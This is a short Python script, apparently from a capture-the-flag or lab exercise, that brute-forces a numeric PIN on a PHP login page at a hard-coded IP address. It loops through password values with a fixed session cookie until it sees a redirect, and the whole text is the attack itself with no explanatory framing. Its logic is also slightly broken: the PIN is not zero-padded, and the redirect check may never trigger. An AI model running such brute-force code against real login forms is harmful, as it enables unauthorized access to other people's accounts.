import requests
import time
import selenium

url = "http://158.39.188.201/steg1/Guest.php"

pin = 0000; 


#r = requests.post(url, data={"password": "1000", "login":""})


headers_dict = {
    "Cookie": "PHPSESSID=rtgmcs9adtonkmslgeen627tc9"
    }

r = requests.post(url, data={"password": "1000", "login":""}, headers=headers_dict)

while not r.is_redirect: 
    data= {
    "password":	f"{pin}",
    "login":	""
    }        
    r = requests.post(url, data=data, headers=headers_dict)
    
    print(r.url)
     
    pin +=1
    print(r.status_code)
    time.sleep(1)
    print(data)
    
print(pin) 
   

